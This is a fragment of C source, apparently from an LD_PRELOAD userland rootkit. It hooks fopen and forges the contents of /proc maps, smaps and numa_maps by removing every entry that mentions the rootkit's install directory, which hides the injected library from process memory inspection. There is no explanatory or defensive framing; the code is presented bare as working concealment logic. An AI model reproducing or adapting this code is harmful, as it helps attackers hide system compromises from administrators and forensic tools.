FILE *forge_maps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt = o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL) if(!strstr(buf, INSTALL_DIR)) fputs(buf, o);
    (void) fclose(pnt);
    (void) fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX];
    int i=0;
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        if(i>0) i++;
        if(i>15) i=0;
        if(strstr(buf, INSTALL_DIR)) i=1;
        if(i==0) (void) fputs(buf,o);
    }
    (void) fclose(pnt);
    (void) fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX], addr[128], type[64], location[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        (void) sscanf(buf, "%s %s %s", addr, type, location);
        if(!strncmp(location, "file=", strlen("file="))) if(!strstr(location, INSTALL_DIR)) fputs(buf,o);
    }
    (void) fclose(pnt);
    (void) fseek(o,0,SEEK_SET);
    return o;
}